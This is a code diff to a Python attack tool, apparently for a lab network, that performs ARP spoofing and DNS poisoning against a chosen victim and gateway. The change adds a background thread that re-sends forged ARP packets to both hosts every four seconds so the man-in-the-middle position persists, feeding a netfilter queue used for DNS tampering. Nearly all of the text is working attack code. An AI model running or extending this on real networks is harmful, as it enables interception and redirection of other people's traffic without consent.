@@ -32,7 +32,6 @@ dns_domain = ""
 
 
 # The name of the network interface to use for sniffing and sending packets
-interval = 4
 RUNINGTHREAD = False
 NET_INTERFACE = "enp0s8"
 ATTACKS = {
@@ -52,9 +51,12 @@ parser = argparse.ArgumentParser(
 )
 
 
-def spoof(target_ip, spoof_ip):
+def spoof(target_ip, spoof_ip, verbose=True):
     packet = ARP(pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)
-    print(getmacbyip(target_ip))
+
+    if verbose:
+        print(getmacbyip(target_ip))
+    
     send(packet, verbose=False)
 
 
@@ -143,8 +145,12 @@ def DNSpoisoning():
 
     ip_victim = custom_input("Enter the IP of the victim u chose: ")
     ip_gate = custom_input("Enter the IP of the gateway (probably 10.0.2.1): ")
-    spoof(ip_gate, ip_victim)
-    spoof(ip_victim, ip_gate)
+    
+    # Start up a thread spoofing every 4 seconds
+    interval = 4
+    arp_spoof_thread = threading.Thread(target=arp_spoof_continuously, args=(ip_gate, ip_victim, interval))
+    arp_spoof_thread.daemon = True
+    arp_spoof_thread.start()
 
     # Start up the netfilterqueue in a separate thread
     queue_thread = threading.Thread(target=netfilter_queue)
@@ -161,6 +167,11 @@ def DNSpoisoning():
         )
     )
 
+def arp_spoof_continuously(ip_gate, ip_victim, interval):
+    while True:
+        spoof(ip_gate, ip_victim, verbose=False)
+        spoof(ip_victim, ip_gate, verbose=False)
+        time.sleep(interval)
 
 def netfilter_queue():
     queue = netfilterqueue.NetfilterQueue()
